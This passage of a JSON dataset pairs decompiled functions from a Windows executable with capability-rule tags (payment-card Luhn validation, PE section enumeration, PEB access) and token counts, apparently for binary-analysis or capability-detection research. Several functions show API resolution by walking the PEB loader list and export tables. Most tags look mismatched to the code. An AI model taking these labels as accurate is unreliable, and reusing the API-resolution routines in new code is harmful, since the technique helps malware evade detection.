            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004018c0(code **param_1)\n\n{\n    *param_1 = 0x43d6f0;\n    if (0 < param_1[5]) {\n        fcn.00409f48(param_1[4]);\n        *param_1 = vtable.std::locale::facet.0;\n        return;\n    }\n    if (param_1[5] < 0) {\n        fcn.0041bae1(param_1[4]);\n    }\n    *param_1 = vtable.std::locale::facet.0;\n    return;\n}\n",
        "token_count": 131
    },
    "00401f60": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t * __thiscall fcn.00401f60(int32_t *param_1, int32_t *param_2)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (**(*param_2 + 0xc))();\n    *param_1 = iVar1 + 0x10;\n    return param_1;\n}\n",
        "token_count": 76
    },
    "00402050": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint * __fastcall fcn.00402050(uint *param_1)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint *in_FS_OFFSET;\n    uint uStack12;\n    uint uStack8;\n    uint uStack4;\n    \n    uStack4 = 0xffffffff;\n    uStack8 = 0x43aadb;\n    uStack12 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack12;\n    *param_1 = 0x43d718;\n    fcn.00418f2e();\n    uStack4 = 0;\n    iVar1 = fcn.0041bab6(4);\n    if (iVar1 == 0) {\n        uVar2 = 0;\n    }\n    else {\n        uVar2 = fcn.00418c6e();\n    }\n    param_1[0xe] = uVar2;\n    fcn.004015d0();\n    *in_FS_OFFSET = uStack12;\n    return param_1;\n}\n",
        "token_count": 222
    },
    "00402270": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint * __thiscall fcn.00402270(uint *param_1, uint param_2)\n\n{\n    uint *in_FS_OFFSET;\n    ulong uVar1;\n    uint uStack16;\n    uint uStack12;\n    uint uStack8;\n    uint uStack4;\n    \n    uStack8 = 0x43aafb;\n    uStack12 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack12;\n    param_1[1] = param_2;\n    uStack4 = 0;\n    *param_1 = 0x43d78c;\n    fcn.00418b42(0x43d714);\n    uVar1 = fcn.00418778();\n    param_1[2] = uVar1;\n    param_1[3] = uVar1 >> 0x20;\n    fcn.00418a59();\n    *in_FS_OFFSET = uStack16;\n    return param_1;\n}\n",
        "token_count": 211
    },
    "00402330": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t * __fastcall fcn.00402330(int32_t *param_1)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    \n    piVar1 = fcn.0041bc88();\n    iVar2 = (**(*piVar1 + 0xc))();\n    *param_1 = iVar2 + 0x10;\n    return param_1;\n}\n",
        "token_count": 88
    },
    "004026b0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t * __thiscall fcn.004026b0(int32_t *param_1, int32_t *param_2)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.00401fd0(*param_2 + -0x10);\n    *param_1 = iVar1 + 0x10;\n    return param_1;\n}\n",
        "token_count": 82
    },
    "00402d80": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t ** __thiscall fcn.00402d80(int32_t **param_1, int32_t *param_2, uint param_3)\n\n{\n    uchar uVar1;\n    uint *in_FS_OFFSET;\n    uint uStack12;\n    uint uStack8;\n    uint uStack4;\n    \n    uStack4 = 0xffffffff;\n    uStack8 = 0x43abc8;\n    uStack12 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack12;\n    *param_1 = param_2;\n    if (*(*(*param_2 + 4) + 0x28 + param_2) != 0) {\n        fcn.00418f5b();\n    }\n    uStack4 = 0;\n    uVar1 = fcn.00402760(param_3);\n    *(param_1 + 1) = uVar1;\n    *in_FS_OFFSET = param_1;\n    return param_1;\n}\n",
        "token_count": 214
    },
    "00402e20": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __thiscall fcn.00402e20(int32_t *param_1, uint param_2, uint32_t param_3)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    ushort *puVar3;\n    uint uVar4;\n    \n    iVar2 = (*_sym.imp.KERNEL32.dll_FindResourceA)(param_2, (param_3 >> 4) + 1 & 0xffff, 6);\n    if (iVar2 != 0) {\n        puVar3 = fcn.004010e0(param_2, iVar2, param_3);\n        if (puVar3 != NULL) {\n            uVar4 = (**0x44d0c0)(0, puVar3 + 1, *puVar3, 0, 0, 0, 0);\n            iVar2 = (*_sym.imp.KERNEL32.dll_WideCharToMultiByte)(uVar4);\n            if ((1U - *(*param_1 + -4) | *(*param_1 + -8) - iVar2) < 0) {\n                fcn.00401f80(iVar2);\n            }\n            uVar4 = (**0x44d0c0)(0, puVar3 + 1, *puVar3, *param_1, iVar2, 0, 0);\n            (*_sym.imp.KERNEL32.dll_WideCharToMultiByte)(uVar4);\n            if ((-1 < iVar2) && (iVar2 <= *(*param_1 + -8))) {\n                *(*param_1 + -0xc) = iVar2;\n                *(iVar2 + *param_1) = 0;\n                return 1;\n            }\n            fcn.004010c0(0x80070057);\n            pcVar1 = swi(3);\n            uVar4 = (*pcVar1)();\n            return uVar4;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 423
    },
    "004033e0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "PEB access",
            "access PEB ldr_data"
        ],
        "decompiled_code": "\nint32_t * fcn.004033e0(int32_t *param_1, int32_t *param_2, int32_t *param_3)\n\n{\n    int32_t *piVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t **ppiVar5;\n    uint *in_FS_OFFSET;\n    uint uStack12;\n    uint uStack8;\n    uint uStack4;\n    \n    piVar1 = param_2;\n    uStack4 = 0xffffffff;\n    uStack8 = 0x43ac28;\n    uStack12 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack12;\n    piVar2 = (**(**(*param_2 + -0x10) + 0x10))();\n    iVar3 = (**(*piVar2 + 0xc))();\n    param_2 = iVar3 + 0x10;\n    uStack4 = 0;\n    fcn.00402ef0(&param_2, *piVar1, *(*piVar1 + -0xc), *param_3, *(*param_3 + -0xc));\n    iVar3 = param_2;\n    ppiVar5 = param_2 + -0x10;\n    iVar4 = fcn.00401fd0(ppiVar5);\n    *param_1 = iVar4 + 0x10;\n    uStack4 = 0xffffffff;\n    piVar1 = iVar3 + -4;\n    LOCK();\n    iVar3 = *piVar1;\n    *piVar1 = *piVar1 + -1;\n    if (iVar3 == 1 || iVar3 + -1 < 0) {\n        (**(**ppiVar5 + 4))(ppiVar5);\n    }\n    *in_FS_OFFSET = uStack12;\n    return param_1;\n}\n",
        "token_count": 406
    },
    "00403490": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "contain loop"
        ],
        "decompiled_code": "\nint32_t * fcn.00403490(int32_t *param_1, int32_t *param_2, char *param_3)\n\n{\n    int32_t *piVar1;\n    char cVar2;\n    int32_t *piVar3;\n    int32_t iVar4;\n    char *pcVar5;\n    int32_t iVar6;\n    int32_t **ppiVar7;\n    uint *in_FS_OFFSET;\n    uint uStack12;\n    uint uStack8;\n    uint uStack4;\n    \n    piVar1 = param_2;\n    uStack4 = 0xffffffff;\n    uStack8 = 0x43ac28;\n    uStack12 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack12;\n    piVar3 = (**(**(*param_2 + -0x10) + 0x10))();\n    iVar4 = (**(*piVar3 + 0xc))();\n    param_2 = iVar4 + 0x10;\n    uStack4 = 0;\n    if (param_3 == NULL) {\n        iVar4 = 0;\n    }\n    else {\n        pcVar5 = param_3;\n        do {\n            cVar2 = *pcVar5;\n            pcVar5 = pcVar5 + 1;\n        } while (cVar2 != '\\0');\n        iVar4 = pcVar5 - (param_3 + 1);\n    }\n    fcn.00402ef0(&param_2, *piVar1, *(*piVar1 + -0xc), param_3, iVar4);\n    iVar4 = param_2;\n    ppiVar7 = param_2 + -0x10;\n    iVar6 = fcn.00401fd0(ppiVar7);\n    *param_1 = iVar6 + 0x10;\n    uStack4 = 0xffffffff;\n    piVar1 = iVar4 + -4;\n    LOCK();\n    iVar4 = *piVar1;\n    *piVar1 = *piVar1 + -1;\n    if (iVar4 == 1 || iVar4 + -1 < 0) {\n        (**(**ppiVar7 + 4))(ppiVar7);\n    }\n    *in_FS_OFFSET = uStack12;\n    return param_1;\n}\n",
        "token_count": 494
    },
    "00403990": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.00403990(int32_t param_1)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint var_4ch;\n    uint var_10h;\n    uint var_4ch_2;\n    int32_t var_44h;\n    uint var_40h;\n    int32_t var_34h;\n    uint var_24h;\n    uint var_18h;\n    int32_t var_14h;\n    uchar *puStack20;\n    uint var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x43ac80;\n    var_ch = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_ch;\n    puStack20 = &stack0xffffffa4;\n    fcn.00407d70();\n    var_4h = 0;\n    fcn.0041ba6b();\n    var_4h._0_1_ = 2;\n    fcn.00407cb0(*(param_1 + 0x60));\n    while (var_34h != 0) {\n        fcn.0041ad1b(&var_14h);\n        var_4h._0_1_ = 3;\n        fcn.00401300();\n        var_4h._0_1_ = 2;\n        piVar1 = var_14h + -4;\n        LOCK();\n        iVar2 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n        if (iVar2 == 1 || iVar2 + -1 < 0) {\n            (**(**(var_14h + -0x10) + 4))(var_14h + -0x10);\n        }\n    }\n    var_4h = 0;\n    fcn.0041ba81();\n    if (var_44h != 0) {\n        iVar2 = *(param_1 + 0x60);\n        if (iVar2 != 0) {\n            fcn.004251ac();\n            fcn.0041bae1(iVar2);\n        }\n        iVar2 = *(param_1 + 100);\n        *(param_1 + 0x60) = 0;\n        if (iVar2 != 0) {\n            fcn.004251ac();\n            fcn.0041bae1(iVar2);\n        }\n        *(param_1 + 100) = 0;\n        if (*(param_1 + 0x5c) != NULL) {\n            (**(**(param_1 + 0x5c) + 4))(1);\n        }\n        *(param_1 + 0x5c) = 0;\n        if (*(param_1 + 0x58) != NULL) {\n            (**(**(param_1 + 0x58) + 4))(1);\n        }\n        *(param_1 + 0x58) = 0;\n    }\n    var_4h = 0xffffffff;\n    fcn.00407a00();\n    *in_FS_OFFSET = var_ch;\n    return;\n}\n",
        "token_count": 705
    },
    "00403e60": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __thiscall fcn.00403e60(int32_t param_1, uint param_2)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint *in_FS_OFFSET;\n    uint var_8h;\n    uint var_10h;\n    uint var_48h;\n    uint var_44h;\n    uint var_20h;\n    uint var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    uchar *puStack20;\n    uint var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x43ad28;\n    var_ch = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_ch;\n    puStack20 = &stack0xffffffa8;\n    if (*(param_1 + 100) != 0) {\n        fcn.00407d70();\n        var_4h = 0;\n        uVar3 = fcn.00403490(&var_18h, param_1 + 0x54, 0x43d87c);\n        var_4h._0_1_ = 1;\n        uVar3 = fcn.004033e0(&var_14h, uVar3, var_8h);\n        var_4h._0_1_ = 2;\n        fcn.00403700(uVar3);\n        var_4h._0_1_ = 1;\n        piVar1 = var_14h + -4;\n        LOCK();\n        iVar2 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n        if (iVar2 + -1 < 1) {\n            (**(**(var_14h + -0x10) + 4))(var_14h + -0x10);\n        }\n        var_4h._0_1_ = 0;\n        piVar1 = var_18h + -4;\n        LOCK();\n        iVar2 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n        if (iVar2 == 1 || iVar2 + -1 < 0) {\n            (**(**(var_18h + -0x10) + 4))(var_18h + -0x10);\n        }\n        fcn.0041ba6b();\n        var_4h = CONCAT31(var_4h._1_3_, 4);\n        fcn.00407cb0(*(param_1 + 100));\n        fcn.00424e09();\n        var_4h = 0;\n        fcn.0041ba81();\n        var_4h = 0xffffffff;\n        fcn.00407a00();\n    }\n    *in_FS_OFFSET = var_ch;\n    return;\n}\n",
        "token_count": 641
    },
    "00404870": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00404870(code **param_1)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack12;\n    uint uStack8;\n    uint uStack4;\n    \n    uStack8 = 0x43add8;\n    uStack12 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack12;\n    *param_1 = 0x43d880;\n    uStack4 = 0;\n    fcn.004048c0();\n    *param_1 = vtable.std::locale::facet.0;\n    *in_FS_OFFSET = uStack12;\n    return;\n}\n",
        "token_count": 136
    },
    "004048c0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004048c0(int32_t param_1)\n\n{\n    fcn.0041bae1(*(param_1 + 8));\n    fcn.0041bae1(*(param_1 + 0x10));\n    fcn.0041bae1(*(param_1 + 0x14));\n    return;\n}\n",
        "token_count": 78
    },
    "004048f0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004048f0(int32_t param_1)\n\n{\n    uint *puVar1;\n    uint uVar2;\n    uint *in_FS_OFFSET;\n    ulong uVar3;\n    uint var_10h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    int32_t var_14h;\n    uchar *puStack20;\n    uint var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x43adf0;\n    var_ch = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_ch;\n    puStack20 = &stack0xffffffcc;\n    var_14h = param_1;\n    puVar1 = fcn.0040ae35();\n    *(param_1 + 8) = 0;\n    *(param_1 + 0x10) = 0;\n    *(param_1 + 0x14) = 0;\n    var_4h = 0;\n    _var_1ch = fcn.00418778();\n    uVar2 = fcn.004049d0(puVar1[2], 0, &var_1ch);\n    *(param_1 + 8) = uVar2;\n    uVar3 = fcn.00418778();\n    _var_1ch = uVar3;\n    uVar2 = fcn.004049d0(\"false\", 0, &var_1ch);\n    *(param_1 + 0x10) = uVar2;\n    _var_24h = fcn.00418778();\n    uVar2 = fcn.004049d0(\"true\", 0, &var_24h);\n    *(param_1 + 0x14) = uVar2;\n    fcn.00418778();\n    *(param_1 + 0xc) = **puVar1;\n    fcn.00418778();\n    *(param_1 + 0xd) = *puVar1[1];\n    *in_FS_OFFSET = var_ch;\n    return;\n}\n",
        "token_count": 478
    },
    "004049d0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004049d0(char *param_1)\n\n{\n    char cVar1;\n    char *pcVar2;\n    char *pcVar3;\n    \n    pcVar2 = param_1;\n    do {\n        cVar1 = *pcVar2;\n        pcVar2 = pcVar2 + 1;\n    } while (cVar1 != '\\0');\n    pcVar2 = pcVar2 + (1 - (param_1 + 1));\n    pcVar3 = fcn.0041bae6(pcVar2);\n    for (; pcVar2 != NULL; pcVar2 = pcVar2 + -1) {\n        *pcVar3 = *param_1;\n        pcVar3 = pcVar3 + 1;\n        param_1 = param_1 + 1;\n    }\n    return;\n}\n",
        "token_count": 181
    },
    "004357c6": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid fcn.004357c6(void)\n\n{\n    int32_t *piVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    code **extraout_ECX;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.0040bb7c();\n    *(unaff_EBP + -0x10) = extraout_ECX;\n    *extraout_ECX = vtable.CWinApp.0;\n    piVar1 = extraout_ECX[0x15];\n    *(unaff_EBP + -4) = 0;\n    if (piVar1 != NULL) {\n        (**(*piVar1 + 4))(1);\n    }\n    if (extraout_ECX[0x21] != NULL) {\n        (**(*extraout_ECX[0x21] + 0x18))(1);\n    }\n    iVar3 = fcn.00434fe8();\n    if (*(iVar3 + 0x14) == '\\0') {\n        if (*0x44f26c != NULL) {\n            (**(**0x44f26c + 4))(1);\n            *0x44f26c = NULL;\n        }\n        if (*0x44f268 != NULL) {\n            (**(**0x44f268 + 4))(1);\n            *0x44f268 = NULL;\n        }\n    }\n    if (extraout_ECX[0x1b] != NULL) {\n        fcn.00426e2d(extraout_ECX[0x1b]);\n    }\n    if (extraout_ECX[0x1c] != NULL) {\n        fcn.00426e2d(extraout_ECX[0x1c]);\n    }\n    pcVar2 = _sym.imp.KERNEL32.dll_GlobalDeleteAtom;\n    if (*(extraout_ECX + 0x23) != 0) {\n        (*_sym.imp.KERNEL32.dll_GlobalDeleteAtom)(*(extraout_ECX + 0x23));\n    }\n    if (*(extraout_ECX + 0x8e) != 0) {\n        (*pcVar2)(*(extraout_ECX + 0x8e));\n    }\n    if (extraout_ECX[0x22] != NULL) {\n        (**(*extraout_ECX[0x22] + 4))(1);\n    }\n    iVar3 = fcn.00434fe8();\n    if (*(iVar3 + 0x10) == extraout_ECX[0x13]) {\n        *(iVar3 + 0x10) = 0;\n    }\n    if (*(iVar3 + 4) == extraout_ECX) {\n        *(iVar3 + 4) = 0;\n    }\n    fcn.00409f48(extraout_ECX[0x13]);\n    fcn.00409f48(extraout_ECX[0x14]);\n    fcn.00409f48(extraout_ECX[0x17]);\n    fcn.00409f48(extraout_ECX[0x18]);\n    fcn.00409f48(extraout_ECX[0x19]);\n    *(unaff_EBP + -4) = 0xffffffff;\n    extraout_ECX[10] = NULL;\n    fcn.0043a92e();\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return;\n}\n",
        "token_count": 799
    },
    "00406c60": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "contain loop"
        ],
        "decompiled_code": "\nint32_t * __thiscall fcn.00406c60(int32_t *param_1, char *param_2)\n\n{\n    char cVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    char *pcVar4;\n    uint unaff_ESI;\n    uint unaff_EDI;\n    uint *in_FS_OFFSET;\n    uint uStack12;\n    uint uStack8;\n    uint uStack4;\n    \n    uStack4 = 0xffffffff;\n    uStack8 = 0x43af38;\n    uStack12 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack12;\n    piVar2 = fcn.0041bc88();\n    iVar3 = (**(*piVar2 + 0xc))();\n    *param_1 = iVar3 + 0x10;\n    uStack4 = 0;\n    if (param_2 == NULL) {\n        iVar3 = 0;\n    }\n    else {\n        if ((param_2 & 0xffff0000) == 0) {\n            iVar3 = fcn.0041bbfb(param_2 & 0xffff);\n            if (iVar3 != 0) {\n                fcn.00402e20(iVar3, param_2 & 0xffff);\n                *in_FS_OFFSET = unaff_EDI;\n                return param_1;\n            }\n            goto code_r0x00406cf2;\n        }\n        pcVar4 = param_2;\n        do {\n            cVar1 = *pcVar4;\n            pcVar4 = pcVar4 + 1;\n        } while (cVar1 != '\\0');\n        iVar3 = pcVar4 - (param_2 + 1);\n    }\n    fcn.00402f80(param_2, iVar3);\ncode_r0x00406cf2:\n    *in_FS_OFFSET = unaff_ESI;\n    return param_1;\n}\n",
        "token_count": 417
    },
    "00406d10": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.00406d10(int32_t param_1, uint param_2)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    code *pcVar3;\n    uint uVar4;\n    uint *in_FS_OFFSET;\n    uint uVar5;\n    int32_t iVar6;\n    uint uStack12;\n    uint uStack8;\n    uint uStack4;\n    \n    uStack12 = *in_FS_OFFSET;\n    uStack4 = 0xffffffff;\n    uStack8 = 0x43af58;\n    *in_FS_OFFSET = &uStack12;\n    fcn.00406c60(param_2);\n    uStack8 = 0;\n    fcn.00406b90(0x43dda4, 2);\n    uVar4 = fcn.0041cf34();\n    pcVar3 = _sym.imp.USER32.dll_SendMessageA;\n    (*_sym.imp.USER32.dll_SendMessageA)(*(param_1 + 0x1c), 0xb1, uVar4, uVar4);\n    iVar6 = 0;\n    (*pcVar3)(*(param_1 + 0x1c), 0xb7, 0, 0);\n    uVar5 = 0;\n    (*pcVar3)(*(param_1 + 0x1c), 0xc2, 0, uVar4);\n    piVar1 = iVar6 + -4;\n    LOCK();\n    iVar2 = *piVar1;\n    *piVar1 = *piVar1 + -1;\n    if (iVar2 == 1 || iVar2 + -1 < 0) {\n        (**(**(iVar6 + -0x10) + 4))(iVar6 + -0x10);\n    }\n    *in_FS_OFFSET = uVar5;\n    return;\n}\n",
        "token_count": 405
    },
    "00406e70": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.00406e70(uint param_1)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t *piVar3;\n    int32_t in_FS_OFFSET;\n    \n    piVar1 = *(*(*(in_FS_OFFSET + 0x30) + 0xc) + 0xc);\n    piVar3 = piVar1;\n    do {\n        iVar2 = fcn.00406dd0(piVar3[0xc], param_1);\n        if (iVar2 == 0) {\n            return piVar3[6];\n        }\n        piVar3 = *piVar3;\n    } while (piVar3 != piVar1);\n    return 0;\n}\n",
        "token_count": 159
    },
    "00406ec0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nint32_t fcn.00406ec0(int32_t param_1, uint8_t *param_2)\n\n{\n    uint8_t uVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint8_t *puVar5;\n    uint32_t uVar6;\n    uint8_t *puVar7;\n    bool bVar8;\n    \n    iVar2 = *(param_1 + 0x3c);\n    iVar4 = fcn.0040b34c(0x43de08);\n    iVar2 = *(iVar4 + iVar2 + param_1);\n    uVar3 = *(iVar2 + 0x18 + param_1);\n    uVar6 = 0;\n    if (uVar3 != 0) {\n        do {\n            puVar5 = *(*(iVar2 + 0x20 + param_1) + param_1 + uVar6 * 4) + param_1;\n            puVar7 = param_2;\n            do {\n                uVar1 = *puVar7;\n                bVar8 = uVar1 < *puVar5;\n                if (uVar1 != *puVar5) {\ncode_r0x00406f44:\n                    iVar4 = (1 - bVar8) - (bVar8 != 0);\n                    goto code_r0x00406f49;\n                }\n                if (uVar1 == 0) break;\n                uVar1 = puVar7[1];\n                bVar8 = uVar1 < puVar5[1];\n                if (uVar1 != puVar5[1]) goto code_r0x00406f44;\n                puVar7 = puVar7 + 2;\n                puVar5 = puVar5 + 2;\n            } while (uVar1 != 0);\n            iVar4 = 0;\ncode_r0x00406f49:\n        } while ((iVar4 != 0) && (uVar6 = uVar6 + 1,  uVar6 < uVar3));\n    }\n    if (uVar6 != uVar3) {\n        return *(*(iVar2 + 0x1c + param_1) + param_1 + *(*(iVar2 + param_1 + 0x24) + param_1 + uVar6 * 2) * 4) + param_1\n        ;\n    }\n    return 0;\n}\n",
        "token_count": 531
    },
    "00407050": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t fcn.00407050(uint param_1, uint param_2, int32_t param_3)\n\n{\n    uint32_t in_EAX;\n    uint uVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    int32_t *unaff_EBX;\n    uint *puVar5;\n    \n    if (param_3 == 0) {\n        return in_EAX & 0xffffff00;\n    }\n    uVar1 = fcn.00406e70(L\"KERNEL32.DLL\", *0x44f064);\n    pcVar2 = fcn.00406ec0(uVar1);\n    uVar1 = (*pcVar2)(L\"CRYPT32.DLL\", 0, 0);\n    pcVar2 = fcn.00406ec0(uVar1, *0x44f060);\n    puVar5 = NULL;\n    iVar3 = (*pcVar2)(param_3, param_1, *0x44d114, 0, unaff_EBX, 0, 0);\n    if (iVar3 == 0) {\n        return 0;\n    }\n    uVar1 = fcn.00409f36(*unaff_EBX + 1);\n    *puVar5 = uVar1;\n    uVar4 = (*pcVar2)(param_3, param_1, *0x44d114, uVar1, unaff_EBX, 0, 0);\n    return uVar4 & 0xffffff00 | uVar4 != 0;\n}\n",
        "token_count": 346
    },
    "00407110": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint * __fastcall fcn.00407110(uint *param_1)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack12;\n    uint uStack8;\n    uint uStack4;\n    \n    uStack4 = 0xffffffff;\n    uStack8 = 0x43af94;\n    uStack12 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack12;\n    fcn.004333d0();\n    uStack4 = 0;\n    *param_1 = 0x43de50;\n    fcn.0042973c();\n    uStack4._0_1_ = 1;\n    fcn.00436ccc();\n    uStack4 = CONCAT31(uStack4._1_3_, 2);\n    fcn.00436a47();\n    *in_FS_OFFSET = uStack12;\n    return param_1;\n}\n",
        "token_count": 200
    },
    "00407180": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.00407180(uint *param_1)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack12;\n    uint uStack8;\n    uint uStack4;\n    \n    uStack8 = 0x43af94;\n    uStack12 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack12;\n    *param_1 = 0x43de50;\n    uStack4 = 2;\n    fcn.0043681c();\n    uStack4._0_1_ = 1;\n    fcn.00436e75();\n    uStack4 = uStack4._1_3_ << 8;\n    fcn.004290f5();\n    uStack4 = 0xffffffff;\n    fcn.00433495();\n    *in_FS_OFFSET = uStack12;\n    return;\n}\n",
        "token_count": 195
    },
    "00407910": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.00407910(int32_t *param_1, uint param_2)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.00409f36(param_2);\n    if (iVar1 == 0) {\n        iVar1 = fcn.004010c0(0x8007000e);\n    }\n    *param_1 = iVar1;\n    return;\n}\n",
        "token_count": 92
    },
    "00407a00": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00407a00(uint *param_1)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t **ppiVar3;\n    uint *in_FS_OFFSET;\n    uint *puVar4;\n    uint uStack12;\n    uint uStack8;\n    uint uStack4;\n    \n    uStack8 = 0x43afcb;\n    uStack12 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack12;\n    *param_1 = 0x43e1c4;\n    uStack4 = 0;\n    puVar4 = param_1;\n    fcn.0041acde();\n    ppiVar3 = param_1[1] + -0x10;\n    uStack4 = 0xffffffff;\n    piVar1 = param_1[1] + -4;\n    LOCK();\n    iVar2 = *piVar1;\n    *piVar1 = *piVar1 + -1;\n    if (iVar2 == 1 || iVar2 + -1 < 0) {\n        (**(**ppiVar3 + 4))(ppiVar3, puVar4);\n    }\n    *in_FS_OFFSET = uStack12;\n    return;\n}\n",
        "token_count": 271
    },
    "00407d70": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
